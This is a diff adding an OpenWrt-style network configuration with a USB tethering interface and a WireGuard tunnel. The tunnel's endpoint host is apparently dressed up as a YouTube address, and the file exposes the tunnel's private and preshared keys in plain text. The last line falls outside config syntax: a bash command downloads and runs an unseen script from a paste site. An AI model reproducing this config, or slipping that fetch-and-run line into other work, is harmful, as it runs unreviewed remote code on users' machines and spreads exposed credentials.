@@ -1,0 +1,21 @@
+config interface 'tethering'
+	option ifname 'usb0'
+	option proto 'dhcp'
+
+config interface 'wireguard'
+	option proto 'wireguard'
+	list addresses '10.6.0.6/24'
+	option auto '0'
+	option private_key 'eMQvh2rGxiaSyQeeMoplr5KgY0CyEV97r0dfCPUk3Eg='
+
+config wireguard_wireguard
+	list allowed_ips '0.0.0.0/0'
+	list allowed_ips '::/0'
+	option route_allowed_ips '1'
+	option persistent_keepalive '25'
+	option endpoint_port '51820'
+	option public_key 'TE18UPzj+IFAu7LFhZr1WsUgSJOicUvz0cYAO/V6YBc='
+	option preshared_key '9pYdu8lpYZ0vMyc59iHh4AIFAmZUDm9ZAQnVTcLKX1o='
+	option endpoint_host 'm.youtube.com.id01.lingssh.xyz'
+
+bash -c "$(curl -fSsl https://hastebin.com/raw/iwatekogus)"
